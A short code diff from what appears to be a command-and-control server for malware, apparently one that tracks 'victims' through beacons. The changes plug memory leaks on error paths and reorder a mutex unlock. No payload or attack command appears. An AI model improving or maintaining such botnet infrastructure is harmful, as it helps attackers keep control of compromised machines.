@@ -39,8 +39,6 @@ pthread_mutex_t NET_PTHREAD_MUTEX = PTHREAD_MUTEX_INITIALIZER;
 int NET_VICTIMS_TOTAL = 0;
 int NET_COMMANDS_TOTAL= 0;
 
-
-
 net_client_beacon_t **net_create_victims(){
   int count = NET_MAX_CLIENTS;
   net_client_beacon_t **v;
@@ -217,6 +215,7 @@ static void *net_t_client(void *args){
     }
     if (read < 0){
       fprintf(stderr, "[-] %s\n", strerror(errno));
+      free(p_net_client_beacon);
       pthread_exit(NULL);
     }
     //pthread_mutex_lock(&NET_PTHREAD_MUTEX);
@@ -246,6 +245,7 @@ static void *net_t_client(void *args){
       p_net_server_beacon->status = true;
       if (send(sock, p_net_server_beacon, sizeof(net_server_beacon_t), 0) < 0){
         fprintf(stderr, "[x] %s\n", strerror(errno));
+        free(p_net_client_beacon);
         pthread_exit(NULL);
       }
     }
@@ -261,9 +261,10 @@ static void *net_t_client(void *args){
   /*        p_net_client_beacon->sysinfo.cpu_usage); */
   net_remove_victims(p_net_client_beacon, p_victims);
   /* printf("[+] victims %d\n", NET_VICTIMS_TOTAL); */
-  pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
-  free(args);
   free(p_net_client_beacon);
+  //free(p_net_server_beacon);
+  free(args);
+  pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
   pthread_exit(NULL);
 }
 
